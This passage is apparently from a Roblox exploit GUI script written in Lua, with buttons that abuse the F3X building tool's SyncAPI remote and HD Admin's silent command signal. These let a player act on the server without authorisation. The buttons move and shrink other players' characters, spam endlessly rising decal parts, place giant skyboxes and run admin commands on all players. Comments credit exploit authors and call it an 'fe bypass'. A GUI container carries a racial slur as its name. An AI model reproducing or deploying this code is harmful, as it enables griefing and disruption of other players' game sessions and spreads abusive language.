					lfakeRel = CFrame.new(-0.730621338, 0.091219902, 0.724395752, 0.663414061, -0.38302213, 0.642787576, -0.352088988, 0.59820956, 0.719846368, -0.660238743, -0.703874588, 0.262002766) 
					mfakeRel = CFrame.new(1.67203522, 0.546735287, -3.84037781, -0.99450171, 0.0754927918, 0.0725754052, 0.0753295794, 0.0342946649, 0.99656868, 0.0727448091, 0.99655664, -0.0397928953)
					local x = Instance.new("Sound",game.SoundService)
					x.SoundId = "rbxassetid://7118966167"
					x:Play()
					game.Debris:AddItem(x,5)
					task.wait(0.1)
					rfakeRel = CFrame.new(1.61221313, 0.308914185, -1.11578369, -0.8213076, 0.412855148, -0.393705875, -0.30127731, 0.272145748, 0.913875699, 0.484443605, 0.869187593, -0.0991315022) 
					lfakeRel = CFrame.new(-0.730621338, 0.091219902, 0.724395752, 0.663414061, -0.38302213, 0.642787576, -0.352088988, 0.59820956, 0.719846368, -0.660238743, -0.703874588, 0.262002766) 
					mfakeRel = CFrame.new(1.36824799, 0.0587096214, -4.05143738, -0.99450171, 0.0754927918, 0.0725754201, 0.0753295794, 0.0342946611, 0.996568799, 0.0727448091, 0.99655652, -0.0397929363)
					task.wait(0.5)
					rfakeRel = CFrame.new(1.63251495, 0.398410797, -0.371368408, -0.918838501, 0.0950292051, -0.383023083, -0.38806349, -0.0411823839, 0.920714438, 0.0717206299, 0.994623423, 0.0747163594) 
					lfakeRel = CFrame.new(-0.730621338, 0.091219902, 0.724395752, 0.663414061, -0.38302213, 0.642787576, -0.352088988, 0.59820956, 0.719846368, -0.660238743, -0.703874588, 0.262002766) 
					mfakeRel = CFrame.new(1.67203522, 0.546735287, -3.84037781, -0.99450171, 0.0754927918, 0.0725754052, 0.0753295794, 0.0342946649, 0.99656868, 0.0727448091, 0.99655664, -0.0397928953)
					task.wait(0.1)
					rfakeRel = CFrame.new(1.63251495, 0.398410797, -0.371368408, -0.918838501, 0.0950292051, -0.383023083, -0.38806349, -0.0411823839, 0.920714438, 0.0717206299, 0.994623423, 0.0747163594) 
					lfakeRel = CFrame.new(-0.730621338, 0.091219902, 0.724395752, 0.663414061, -0.38302213, 0.642787576, -0.352088988, 0.59820956, 0.719846368, -0.660238743, -0.703874588, 0.262002766) 
					mfakeRel = CFrame.new(1.67203522, 0.546735287, -3.84037781, -0.99450171, 0.0754927918, 0.0725754052, 0.0753295794, 0.0342946649, 0.99656868, 0.0727448091, 0.99655664, -0.0397928953)
					task.wait(0.1)
					rfakeRel = CFrame.new(1.63251495, 0.398410916, -0.371368408, -0.604866743, -0.6981619, -0.383022904, -0.188849837, -0.341503978, 0.920712948, -0.773609996, 0.629242182, 0.0747164488) 
					lfakeRel = CFrame.new(-0.730621338, 0.091219902, 0.724395752, 0.663414061, -0.38302213, 0.642787576, -0.352088988, 0.59820956, 0.719846368, -0.660238743, -0.703874588, 0.262002766) 
					mfakeRel = CFrame.new(2.64407349, 2.26358032, -2.63957214, -0.709787369, -0.0868241489, -0.699044824, -0.576889515, -0.497825563, 0.647586584, -0.404228657, 0.862920225, 0.303262413)
					task.wait(0.1)
					x:Play()
					attacking = false
					rfakeRel = CFrame.new(2.00197601, 0.529197574, -0.0891418457, -0.0145850861, -0.9236238, -0.383022815, 0.0748470128, -0.382997364, 0.920712292, -0.997088373, -0.0152394464, 0.0747165307) 
					lfakeRel = CFrame.new(-0.730621338, 0.091219902, 0.724395752, 0.663414061, -0.38302213, 0.642787576, -0.352088988, 0.59820956, 0.719846368, -0.660238743, -0.703874588, 0.262002766) 
					mfakeRel = CFrame.new(3.31957245, 3.45993948, -0.722579956, 0.0499905124, -0.0713938102, -0.99619472, -0.34327212, -0.937904716, 0.0499904677, -0.937904656, 0.33946681, -0.07139384)
					task.wait(0.1)
					rfakeRel = CFrame.new(1.08930969, 0.0900583267, 0.643432617, 0.764953971, 0.517821431, -0.383022487, 0.270802021, 0.280988753, 0.920712829, 0.584389687, -0.808025837, 0.0747166276) 
					lfakeRel = CFrame.new(-0.730621338, 0.091219902, 0.724395752, 0.663414061, -0.38302213, 0.642787576, -0.352088988, 0.59820956, 0.719846368, -0.660238743, -0.703874588, 0.262002766) 
					mfakeRel = CFrame.new(0.375, 1.50666738, 3.06625366, 1, 0, 0, 0, -0.819151998, 0.57357645, 0, -0.57357645, -0.819151998)
					db = false
				end
			end
		end)
	
		game.UserInputService.InputBegan:Connect(function(key,typing)
			if typing or death then return end
			if key.KeyCode == Enum.KeyCode.E then
				if db == false then
					db = true
					rfakeRel = CFrame.new(1.52076721, 0.282814145, 0.48008728, 0.862933695, -0.329603225, -0.383023024, 0.385498226, -0.0606598705, 0.920713603, -0.326703668, -0.942168117, 0.0747169331) 
					lfakeRel = CFrame.new(-0.730621338, 0.091219902, 0.724395752, 0.663414061, -0.38302213, 0.642787576, -0.352088988, 0.59820956, 0.719846368, -0.660238743, -0.703874588, 0.262002766) 
					mfakeRel = CFrame.new(2.73793793, 2.20088673, 1.64593506, 0.409575999, -0.286788315, -0.866025388, -0.0629474223, -0.955923796, 0.286788315, -0.910101712, -0.0629475489, -0.409575969)
					task.wait(0.1)
					rfakeRel = CFrame.new(1.73723602, 0.942415714, -1.53013611, -0.149221137, 0.463944554, -0.8732059, -0.922985077, -0.382158101, -0.0453172177, -0.354727358, 0.799193799, 0.485239983) 
					lfakeRel = CFrame.new(-0.730621338, 0.091219902, 0.724395752, 0.663414061, -0.38302213, 0.642787576, -0.352088988, 0.59820956, 0.719846368, -0.660238743, -0.703874588, 0.262002766) 
					mfakeRel = CFrame.new(0.362007141, 2.36193848, -4.6451416, -0.873207331, 0.463944554, 0.14921321, -0.0453256294, -0.382158071, 0.922984779, 0.485236794, 0.799193799, 0.354731828)
					local x = Instance.new("Sound",game.SoundService)
					x.SoundId = "rbxassetid://7118966167"
					x:Play()
					game.Debris:AddItem(x,5)
					task.wait(0.1)
					rfakeRel = CFrame.new(1.73725128, 0.942420959, -1.53015137, -0.149221122, 0.916688144, -0.370696753, -0.922984958, -0.263620734, -0.280361503, -0.354727298, 0.300311804, 0.885427237) 
					lfakeRel = CFrame.new(-1.10781097, 0.418335795, 0.751068115, 0.754406571, 0.133022413, 0.642787635, -0.654237568, 0.231936723, 0.719846547, -0.0533303916, -0.963592589, 0.262002826) 
					mfakeRel = CFrame.new(-1.0610199, 2.81447268, -1.97209167, -0.623079479, 0.780599415, -0.049364008, -0.78206259, -0.622750044, 0.0236775279, -0.0122587746, 0.0533587225, 0.998500228)
					task.wait(1.5)
					rfakeRel = CFrame.new(1.73723602, 0.942415714, -1.53013611, -0.149221137, 0.463944554, -0.8732059, -0.922985077, -0.382158101, -0.0453172177, -0.354727358, 0.799193799, 0.485239983) 
					lfakeRel = CFrame.new(-0.730621338, 0.091219902, 0.724395752, 0.663414061, -0.38302213, 0.642787576, -0.352088988, 0.59820956, 0.719846368, -0.660238743, -0.703874588, 0.262002766) 
					mfakeRel = CFrame.new(0.362007141, 2.36193848, -4.6451416, -0.873207331, 0.463944554, 0.14921321, -0.0453256294, -0.382158071, 0.922984779, 0.485236794, 0.799193799, 0.354731828)
					local x = Instance.new("Sound",game.SoundService)
					x.SoundId = "rbxassetid://7118966167"
					x:Play()
					game.Debris:AddItem(x,5)
					task.wait(0.1)
					rfakeRel = CFrame.new(1.52076721, 0.282814145, 0.48008728, 0.862933695, -0.329603225, -0.383023024, 0.385498226, -0.0606598705, 0.920713603, -0.326703668, -0.942168117, 0.0747169331) 
					lfakeRel = CFrame.new(-0.730621338, 0.091219902, 0.724395752, 0.663414061, -0.38302213, 0.642787576, -0.352088988, 0.59820956, 0.719846368, -0.660238743, -0.703874588, 0.262002766) 
					mfakeRel = CFrame.new(2.73793793, 2.20088673, 1.64593506, 0.409575999, -0.286788315, -0.866025388, -0.0629474223, -0.955923796, 0.286788315, -0.910101712, -0.0629475489, -0.409575969)
					task.wait(0.1)
					rfakeRel = CFrame.new(1.08930969, 0.0900583267, 0.643432617, 0.764953971, 0.517821431, -0.383022487, 0.270802021, 0.280988753, 0.920712829, 0.584389687, -0.808025837, 0.0747166276) 
					lfakeRel = CFrame.new(-0.730621338, 0.091219902, 0.724395752, 0.663414061, -0.38302213, 0.642787576, -0.352088988, 0.59820956, 0.719846368, -0.660238743, -0.703874588, 0.262002766) 
					mfakeRel = CFrame.new(0.375, 1.50666738, 3.06625366, 1, 0, 0, 0, -0.819151998, 0.57357645, 0, -0.57357645, -0.819151998)
					db = false
				end
			end
		end)
	
		mfake.Touched:Connect(function(hit)
			if hit.Parent:FindFirstChild("Humanoid") and hit.Parent ~= char and attacking == true then
				hit.Parent:MoveTo(char.HumanoidRootPart.Position + char.HumanoidRootPart.CFrame.LookVector * 5)
				local Model = hit.Parent
				local Changes = {}
				for _, Part in pairs(Model:GetDescendants()) do
					if Part:IsA("BasePart") then
						table.insert(Changes, {
							Part = Part;
							CFrame = Part.CFrame;
						})
					end
				end;
				table.insert(Changes, {
	
					Model = Model; 
					Pivot = Model:GetPivot(); 
				})
	
				handle.Parent.SyncAPI:Invoke("SyncMove",Changes)
				anchor(true,Model.HumanoidRootPart)
				resize(Model.Head,Model.Head.Size - Vector3.new(1.9,1.9,1.9))
			end
		end)
		
		
		
		
		
		
		
		
		
		
		
		
		
	end)
	
end;
task.spawn(C_1d);
-- StarterGui.ScreenGui.nigg.ScrollingFrame.TextButton.LocalScript
local function C_1f()
local script = G2L["1f"];
	script.Parent.MouseButton1Click:Connect(function()
		
		
		
		
		
		local ReplicatedStorage = game:GetService("ReplicatedStorage")
		local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
	
		RequestCommand:InvokeServer(";fogcolor black")
		wait(0.25)
		local player = game.Players.LocalPlayer
		local char = player.Character
		local tool
		for i,v in player:GetDescendants() do
			if v.Name == "SyncAPI" then
				tool = v.Parent
			end
		end
		for i,v in game.ReplicatedStorage:GetDescendants() do
			if v.Name == "SyncAPI" then
				tool = v.Parent
			end
		end
		--craaa
		remote = tool.SyncAPI.ServerEndpoint
		function _(args)
	
	
	
			--HD transparent skybox by skyl0rd
			--LMAOOO
			--===--=-=-==-=DDDDDDDDDDDDDDDDD>>>>>>>>>>>>>>>>
			--++++++++++++
			-----------------========
			------------===================================
			-----------------==========
			------------=
			--=
			--=
	
	
	
	
	
	
			remote:InvokeServer(unpack(args))
		end
		function SetCollision(part,boolean)
			local args = {
				[1] = "SyncCollision",
				[2] = {
					[1] = {
						["Part"] = part,
						["CanCollide"] = boolean
					}
				}
			}
			_(args)
		end
		function SetAnchor(boolean,part)
			local args = {
				[1] = "SyncAnchor",
				[2] = {
					[1] = {
						["Part"] = part,
						["Anchored"] = boolean
					}
				}
			}
			_(args)
		end
		function CreatePart(cf,parent)
			local args = {
				[1] = "CreatePart",
				[2] = "Normal",
				[3] = cf,
				[4] = parent
			}
			_(args)
		end
		function DestroyPart(part)
			local args = {
				[1] = "Remove",
				[2] = {
					[1] = part
				}
			}
			_(args)
		end
		function MovePart(part,cf)
			local args = {
				[1] = "SyncMove",
				[2] = {
					[1] = {
						["Part"] = part,
						["CFrame"] = cf
					}
				}
			}
			_(args)
		end
		function Resize(part,size,cf)
			local args = {
				[1] = "SyncResize",
				[2] = {
					[1] = {
						["Part"] = part,
						["CFrame"] = cf,
						["Size"] = size
					}
				}
			}
			_(args)
		end
		function AddMesh(part)
			local args = {
				[1] = "CreateMeshes",
				[2] = {
					[1] = {
						["Part"] = part
					}
				}
			}
			_(args)
		end
	
		function SetMesh(part,meshid)
			local args = {
				[1] = "SyncMesh",
				[2] = {
					[1] = {
						["Part"] = part,
						["MeshId"] = "rbxassetid://"..meshid
					}
				}
			}
			_(args)
		end
		function SetTexture(part, texid)
			local args = {
				[1] = "SyncMesh",
				[2] = {
					[1] = {
						["Part"] = part,
						["TextureId"] = "rbxassetid://"..texid
					}
				}
			}
			_(args)
		end
		function SetName(part, stringg)
			local args = {
				[1] = "SetName",
				[2] = {
					[1] = part
				},
				[3] = stringg
			}
	
			_(args)
		end
		function MeshResize(part,size)
			local args = {
				[1] = "SyncMesh",
				[2] = {
					[1] = {
						["Part"] = part,
						["Scale"] = size
					}
				}
			}
			_(args)
		end
		function Weld(part1, part2,lead)
			local args = {
				[1] = "CreateWelds",
				[2] = {
					[1] = part1,
					[2] = part2
				},
				[3] = lead
			}
			_(args)
	
		end
		function SetLocked(part,boolean)
			local args = {
				[1] = "SetLocked",
				[2] = {
					[1] = part
				},
				[3] = boolean
			}
			_(args)
		end
		function SetTrans(part,int)
			local args = {
				[1] = "SyncMaterial",
				[2] = {
					[1] = {
						["Part"] = part,
						["Transparency"] = int
					}
				}
			}
			_(args)
		end
		function CreateSpotlight(part)
			local args = {
				[1] = "CreateLights",
				[2] = {
					[1] = {
						["Part"] = part,
						["LightType"] = "SpotLight"
					}
				}
			}
			_(args)
		end
		function SyncLighting(part,brightness)
			local args = {
				[1] = "SyncLighting",
				[2] = {
					[1] = {
						["Part"] = part,
						["LightType"] = "SpotLight",
						["Brightness"] = brightness
					}
				}
			}
			_(args)
		end
		function Color(part,color)
			local args = {
				[1] = "SyncColor",
				[2] = {
					[1] = {
						["Part"] = part,
						["Color"] = color --[[Color3]],
						["UnionColoring"] = false
					}
				}
			}
			_(args)
		end
		function SpawnDecal(part,side)
			local args = {
				[1] = "CreateTextures",
				[2] = {
					[1] = {
						["Part"] = part,
						["Face"] = side,
						["TextureType"] = "Decal"
					}
				}
			}
	
			_(args)
		end
		function AddDecal(part,asset,side)
			local args = {
				[1] = "SyncTexture",
				[2] = {
					[1] = {
						["Part"] = part,
						["Face"] = side,
						["TextureType"] = "Decal",
						["Texture"] = "rbxassetid://".. asset
					}
				}
			}
			_(args)
		end
	
		function Sky(id)
			e = char.HumanoidRootPart.CFrame.x
			f = char.HumanoidRootPart.CFrame.y
			g = char.HumanoidRootPart.CFrame.z
			CreatePart(CFrame.new(math.floor(e),math.floor(f),math.floor(g)) + Vector3.new(0,6,0),workspace)
			for i,v in game.Workspace:GetDescendants() do
				if v:IsA("BasePart") and v.CFrame.x == math.floor(e) and v.CFrame.z == math.floor(g) then
					--spawn(function()
					SetName(v,"Sky")
					AddMesh(v)
					--end)
					--spawn(function()
					SetMesh(v,"111891702759441")
					SetTexture(v,id)
					SetTrans(v, 0)
					MeshResize(v,Vector3.new(900,900,900))
					SetLocked(v,true)
				end
			end
		end
		Sky("77638145387265")
		
		
		
		
		
		
		
		
		
		
		
		
	end)
	
end;
task.spawn(C_1f);
-- StarterGui.ScreenGui.nigg.ScrollingFrame.TextButton.LocalScript
local function C_21()
local script = G2L["21"];
	script.Parent.MouseButton1Click:Connect(function()
		
		
		-- first you want to know about hd admin remote or shit there silent hd admin command
	
		local ReplicatedStorage = game:GetService("ReplicatedStorage")
		local RequestCommandSilent = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
	
		RequestCommandSilent:InvokeServer(";title me skyl0rd")
	
		--                                                           ^ put a command like ;fly
		--i just have that nga, of you want more dm me at roadblockswashere
	
		
		
		
		
		
		
		
		
		
		
		
		
		
		
		
	end)
	
end;
task.spawn(C_21);
-- StarterGui.ScreenGui.nigg.ScrollingFrame.TextButton.LocalScript
local function C_23()
local script = G2L["23"];
	script.Parent.MouseButton1Click:Connect(function()
		
		local player = game.Players.LocalPlayer
		local char = player.Character
		local tool
		for i,v in player:GetDescendants() do
			if v.Name == "SyncAPI" then
				tool = v.Parent
			end
		end
		for i,v in game.ReplicatedStorage:GetDescendants() do
			if v.Name == "SyncAPI" then
				tool = v.Parent
			end
		end
		remote = tool.SyncAPI.ServerEndpoint
		function _(args)
			remote:InvokeServer(unpack(args))
		end
		function SetCollision(part,boolean)
			local args = {
				[1] = "SyncCollision",
				[2] = {
					[1] = {
						["Part"] = part,
						["CanCollide"] = boolean
					}
				}
			}
			_(args)
		end
		function SetAnchor(boolean,part)
			local args = {
				[1] = "SyncAnchor",
				[2] = {
					[1] = {
						["Part"] = part,
						["Anchored"] = boolean
					}
				}
			}
			_(args)
		end
		function CreatePart(cf,parent)
			local args = {
				[1] = "CreatePart",
				[2] = "Normal",
				[3] = cf,
				[4] = parent
			}
			_(args)
		end
		function DestroyPart(part)
			local args = {
				[1] = "Remove",
				[2] = {
					[1] = part
				}
			}
			_(args)
		end
		function MovePart(part,cf)
			local args = {
				[1] = "SyncMove",
				[2] = {
					[1] = {
						["Part"] = part,
						["CFrame"] = cf
					}
				}
			}
			_(args)
		end
		function Resize(part,size,cf)
			local args = {
				[1] = "SyncResize",
				[2] = {
					[1] = {
						["Part"] = part,
						["CFrame"] = cf,
						["Size"] = size
					}
				}
			}
			_(args)
		end
		function AddMesh(part)
			local args = {
				[1] = "CreateMeshes",
				[2] = {
					[1] = {
						["Part"] = part
					}
				}
			}
			_(args)
		end
	
		function SetMesh(part,meshid)
			local args = {
				[1] = "SyncMesh",
				[2] = {
					[1] = {
						["Part"] = part,
						["MeshId"] = "rbxassetid://"..meshid
					}
				}
			}
			_(args)
		end
		function SetTexture(part, texid)
			local args = {
				[1] = "SyncMesh",
				[2] = {
					[1] = {
						["Part"] = part,
						["TextureId"] = "rbxassetid://"..texid
					}
				}
			}
			_(args)
		end
		function SetName(part, stringg)
			local args = {
				[1] = "SetName",
				[2] = {
					[1] = part
				},
				[3] = stringg
			}
	
			_(args)
		end
		function MeshResize(part,size)
			local args = {
				[1] = "SyncMesh",
				[2] = {
					[1] = {
						["Part"] = part,
						["Scale"] = size
					}
				}
			}
			_(args)
		end
		function Weld(part1, part2,lead)
			local args = {
				[1] = "CreateWelds",
				[2] = {
					[1] = part1,
					[2] = part2
				},
				[3] = lead
			}
			_(args)
	
		end
		function SetLocked(part,boolean)
			local args = {
				[1] = "SetLocked",
				[2] = {
					[1] = part
				},
				[3] = boolean
			}
			_(args)
		end
		function SetTrans(part,int)
			local args = {
				[1] = "SyncMaterial",
				[2] = {
					[1] = {
						["Part"] = part,
						["Transparency"] = int
					}
				}
			}
			_(args)
		end
		function CreateSpotlight(part)
			local args = {
				[1] = "CreateLights",
				[2] = {
					[1] = {
						["Part"] = part,
						["LightType"] = "SpotLight"
					}
				}
			}
			_(args)
		end
		function SyncLighting(part,brightness)
			local args = {
				[1] = "SyncLighting",
				[2] = {
					[1] = {
						["Part"] = part,
						["LightType"] = "SpotLight",
						["Brightness"] = brightness
					}
				}
			}
			_(args)
		end
		function Color(part,color)
			local args = {
				[1] = "SyncColor",
				[2] = {
					[1] = {
						["Part"] = part,
						["Color"] = color --[[Color3]],
						["UnionColoring"] = false
					}
				}
			}
			_(args)
		end
		function SpawnDecal(part,side)
			local args = {
				[1] = "CreateTextures",
				[2] = {
					[1] = {
						["Part"] = part,
						["Face"] = side,
						["TextureType"] = "Decal"
					}
				}
			}
	
			_(args)
		end
		function AddDecal(part,asset,side)
			local args = {
				[1] = "SyncTexture",
				[2] = {
					[1] = {
						["Part"] = part,
						["Face"] = side,
						["TextureType"] = "Decal",
						["Texture"] = "rbxassetid://".. asset
					}
				}
			}
			_(args)
		end
		while wait(0.1) do
			spawn(function()
				e = char.HumanoidRootPart.CFrame.x + math.random(-100, 100)
				f = char.HumanoidRootPart.CFrame.y
				g = char.HumanoidRootPart.CFrame.z + math.random(-100, 100)
				CreatePart(CFrame.new(math.floor(e),math.floor(f),math.floor(g)) + Vector3.new(0,6,0),workspace)
				for i,v in game.Workspace:GetDescendants() do
					if v:IsA("BasePart") and v.CFrame.x == math.floor(e) and v.CFrame.z == math.floor(g) then
	
						SetName(v,"piroca")
						SpawnDecal(v,Enum.NormalId.Front)
						AddDecal(v,"4554325647",Enum.NormalId.Front)
						SpawnDecal(v,Enum.NormalId.Back)
						AddDecal(v,"18829969156",Enum.NormalId.Back)
						SetTrans(v,1)
						Resize(v,Vector3.new(7,7,0.1),v.CFrame)
						SetLocked(v,true)
						while wait(0.01) do
							MovePart(v,CFrame.new(v.CFrame.x,v.CFrame.y + 1,v.CFrame.z))
						end
					end
				end
			end)
		end
	
	
	
		
		
		
		
		
		
		
		
		
		
		
		
		
		
		
		
	end)
	
end;
task.spawn(C_23);
-- StarterGui.ScreenGui.nigg.ScrollingFrame.TextButton.LocalScript
local function C_25()
local script = G2L["25"];
	script.Parent.MouseButton1Click:Connect(function()
		
		
		
		
		
		local ReplicatedStorage = game:GetService("ReplicatedStorage")
		local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
		RequestCommand:InvokeServer(";r6 all ;char all WHYROBLOX322")
		
		
		
		
		
		
		
		
		
		
		
		
	end)
	
end;
task.spawn(C_25);
-- StarterGui.ScreenGui.nigg.ScrollingFrame.TextButton.LocalScript
local function C_27()
local script = G2L["27"];
	script.Parent.MouseButton1Click:Connect(function()
		
		
	
		local ReplicatedStorage = game:GetService("ReplicatedStorage")
		local RequestCommandSilent = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
	
		RequestCommandSilent:InvokeServer(";sm loading Nex Pluvia Remake..")
		RequestCommandSilent:InvokeServer(";titlep me _")
		RequestCommandSilent:InvokeServer(";titlep me __")
		RequestCommandSilent:InvokeServer(";titlep me __N")
		RequestCommandSilent:InvokeServer(";titlep me __Ne")
		RequestCommandSilent:InvokeServer(";titlep me __Nex")
		RequestCommandSilent:InvokeServer(";titlep me __Nex P")
		RequestCommandSilent:InvokeServer(";titlep me __Nex Pl")
		RequestCommandSilent:InvokeServer(";titlep me __Nex Plu")
		RequestCommandSilent:InvokeServer(";titlep me __Nex Pluv")
		RequestCommandSilent:InvokeServer(";titlep me __Nex Pluvi")
		RequestCommandSilent:InvokeServer(";titlep me __Nex Pluvia")
		RequestCommandSilent:InvokeServer(";titlep me _Nex Pluvia")
		RequestCommandSilent:InvokeServer(";titlep me Nex Pluvia")
		RequestCommandSilent:InvokeServer(";titlep me -Nex Pluvia")
		RequestCommandSilent:InvokeServer(";titlep me -Nex Pluvia-")
		RequestCommandSilent:InvokeServer(";titlep me -Nex Pluvia")
		RequestCommandSilent:InvokeServer(";titlep me Nex Pluvia")
		RequestCommandSilent:InvokeServer(";notice me Nex Pluvia Loaded")
	
	
		local Players = game:GetService("Players")
		local RunService = game:GetService("RunService")
	
		local player = Players.LocalPlayer
		local char = player.Character or player.CharacterAdded:Wait()
		local hrp = char:WaitForChild("HumanoidRootPart")
	
		-- หา SyncAPI
		local tool
		for _,v in ipairs(player:GetDescendants()) do
			if v.Name == "SyncAPI" then tool = v.Parent end
		end
		for _,v in ipairs(game.ReplicatedStorage:GetDescendants()) do
			if v.Name == "SyncAPI" then tool = v.Parent end
		end
		if not tool then return warn("ไม่พบ SyncAPI") end
	
		local remote = tool.SyncAPI.ServerEndpoint
		local function _(args)
			remote:InvokeServer(unpack(args))
		end
	
		-- ฟังก์ชัน SyncAPI
		function SetCollision(part,boolean)
			_( {"SyncCollision",{ {Part=part,CanCollide=boolean} } } )
		end
		function SetAnchor(boolean,part)
			_( {"SyncAnchor",{ {Part=part,Anchored=boolean} } } )
		end
		function CreatePart(cf,parent)
			_( {"CreatePart","Normal",cf,parent} )
		end
		function MovePart(part,cf)
			_( {"SyncMove",{ {Part=part,CFrame=cf} } } )
		end
		function AddMesh(part)
			_( {"CreateMeshes",{ {Part=part} } } )
		end
		function SetMesh(part,meshid)
			_( {"SyncMesh",{ {Part=part, MeshId="rbxassetid://"..meshid} } } )
		end
		function MeshResize(part,size)
			_( {"SyncMesh",{ {Part=part, Scale=size} } } )
		end
		function SetName(part,stringg)
			_( {"SetName",{part},stringg} )
		end
		function Color(part,color)
			_( {"SyncColor",{ {Part=part,Color=color,UnionColoring=false} } } )
		end
	
		-- ฟังก์ชันรอ Part
		local function waitForPart(pos)
			local part
			for i=1,50 do
				for _,v in ipairs(workspace:GetDescendants()) do
					if v:IsA("BasePart") and (v.Position - pos).Magnitude < 1 then
						part = v
						return part
					end
				end
				task.wait(0.05)
			end
			return part
		end
	
		-- สร้าง Mesh รอบผู้เล่น ขนาด 2x2x2
		local function createOrbitMesh()
			local radius = 7
			local speed = math.rad(45)
			local angle = 4
	
			local cf = hrp.CFrame * CFrame.new(radius,0,0)
			CreatePart(cf, workspace)
			task.wait(0.2)
	
			local meshPart = waitForPart(cf.Position)
			if not meshPart then return warn("ไม่พบ Part") end
	
			SetName(meshPart,"OrbitMesh")
			SetAnchor(true, meshPart)
			SetCollision(meshPart,false)
			AddMesh(meshPart)
			SetMesh(meshPart,"6761894955")
			MeshResize(meshPart, Vector3.new(0.1,0.1,0.1)) -- ขนาด 2x2x2
			Color(meshPart, Color3.fromRGB(0,255,0))
	
			RunService.Heartbeat:Connect(function(dt)
				angle = angle + dt*speed
				local x = math.cos(angle)*radius
				local z = math.sin(angle)*radius
				local pos = hrp.Position + Vector3.new(x,0,z)
				local cfNew = CFrame.new(pos) * CFrame.Angles(0, angle, 0)
				MovePart(meshPart, cfNew)
			end)
		end
	
		createOrbitMesh()
	
	
		
		
		
		
		
		
		
		
		
		
		
		
		
		
	end)
	
end;
task.spawn(C_27);
-- StarterGui.ScreenGui.nigg.ScrollingFrame.TextButton.LocalScript
local function C_29()
local script = G2L["29"];
	script.Parent.MouseButton1Click:Connect(function()
		
		
		
		
		local ReplicatedStorage = game:GetService("ReplicatedStorage")
		local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
	
		RequestCommand:InvokeServer(";time 0 ;fogcolor black ;unfog")
	
		local Players = game:GetService("Players")
		local workspace = game:GetService("Workspace")
		local player = Players.LocalPlayer
	
		local function findTool()
			local char = player.Character or player.CharacterAdded:Wait()
	
			for _, v in ipairs(char:GetChildren()) do
				if v:IsA("Tool") and v:FindFirstChild("SyncAPI") then
					return v
				end
			end
	
			for _, v in ipairs(player.Backpack:GetChildren()) do
				if v:IsA("Tool") and v:FindFirstChild("SyncAPI") then
					return v
				end
			end
		end
	
		local tool = findTool()
		if not tool then return end
	
		local remote = tool.SyncAPI.ServerEndpoint
		local function call(a)
			return remote:InvokeServer(unpack(a))
		end
	
		-- i dont used the b2s sky function anymore, i used this instead
		local hack = workspace:FindFirstChild("E")
		if hack then
			call({ "Remove", { hack } })
		end
	
		local char = player.Character or player.CharacterAdded:Wait()
		local hrp = char:WaitForChild("HumanoidRootPart")
		local cf = CFrame.new(hrp.Position + Vector3.new(0, 1000, 0))
	
		local sky = remote:InvokeServer("CreatePart", "Normal", cf, workspace)
	
		task.spawn(function()
			call({ "SyncAnchor", { { Part = sky, Anchored = true } } })
		end)
	
		task.spawn(function()
			call({ "SyncCollision", { { Part = sky, CanCollide = false } } })
		end)
	
		task.spawn(function()
			call({ "CreateMeshes", { { Part = sky } } })
		end)
	
		task.spawn(function()
			call({
				"SyncMesh",
				{{
					Part = sky,
					MeshId = "rbxassetid://111891702759441",
					TextureId = "rbxassetid://115132399380546",
					Scale = Vector3.new(100999, 100999, 100999),
					VertexColor = Vector3.new(3.6, 3.6, 3.6)
				}}
			})
		end)
	
		task.spawn(function()
			call({ "SetLocked", { sky }, true })
		end)
	
		task.spawn(function()
			call({ "SetName", { sky }, "cZerSky" })
		end)
	
		task.spawn(function()
			call({ "SyncMaterial", { { Part = sky, Transparency = 0 } } })
		end)
	
		task.spawn(function()
			call({ "SyncMove", { { Part = sky, CFrame = cf } } }) -- fe bypass rel
		end)
		
		
		
		
		
		
		
		
		
		
		
		
		
	end)
	
end;
task.spawn(C_29);
-- StarterGui.ScreenGui.nigg.ScrollingFrame.TextButton.LocalScript
local function C_2b()
local script = G2L["2b"];
	script.Parent.MouseButton1Click:Connect(function()
		
		
		local ReplicatedStorage = game:GetService("ReplicatedStorage")
		local RequestCommandSilent = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
	
		RequestCommandSilent:InvokeServer(";fogcolor black")
		RequestCommandSilent:InvokeServer(";time 010")
	
	--[[ 
	ok vro cuz my script have errors with getgenv and obfuscators not working,here the source.
	== Epik spinning sky f3x By ItsKittyyyGD ==
	Dont skid and give credit plz
	also reuploaded cuz scriptblox put my script on scripts f3x of 2024 
	]]
		-- { SOURCE: } --
	
	
		local Players = game:GetService("Players")
		local RunService = game:GetService("RunService")
		local player = Players.LocalPlayer
		local character = player.Character or player.CharacterAdded:Wait()
		local tool
	
		for _, obj in player:GetDescendants() do
			if obj.Name == "SyncAPI" then
				tool = obj.Parent
			end
		end
	
		for _, obj in game.ReplicatedStorage:GetDescendants() do
			if obj.Name == "SyncAPI" then
				tool = obj.Parent
			end
		end
	
		local SyncAPI = tool.SyncAPI
		local part
		local baseCF
		local angle = 0
		local connection
	
		local function _(args)
			SyncAPI:Invoke(unpack(args))
		end
	
		local function CreatePart(cf, parent)
			local args = {
				[1] = "CreatePart",
				[2] = "Normal",
				[3] = cf,
				[4] = parent
			}
			_(args)
		end
	
		local function SetAnchor(p, anchored)
			local args = {
				[1] = "SyncAnchor",
				[2] = {
					[1] = {
						["Part"] = p,
						["Anchored"] = anchored
					}
				}
			}
			_(args)
		end
	
		local function AddMesh(p)
			local args = {
				[1] = "CreateMeshes",
				[2] = {
					[1] = {
						["Part"] = p
					}
				}
			}
			_(args)
		end
	
		local function SetMesh(p, meshId)
			local args = {
				[1] = "SyncMesh",
				[2] = {
					[1] = {
						["Part"] = p,
						["MeshId"] = "rbxassetid://"..meshId
					}
				}
			}
			_(args)
		end
	
		local function SetTexture(p, textureId)
			local args = {
				[1] = "SyncMesh",
				[2] = {
					[1] = {
						["Part"] = p,
						["TextureId"] = textureId
					}
				}
			}
			_(args)
		end
	
		local function ResizeMesh(p, size)
			local args = {
				[1] = "SyncMesh",
				[2] = {
					[1] = {
						["Part"] = p,
						["Scale"] = size
					}
				}
			}
			_(args)
		end
	
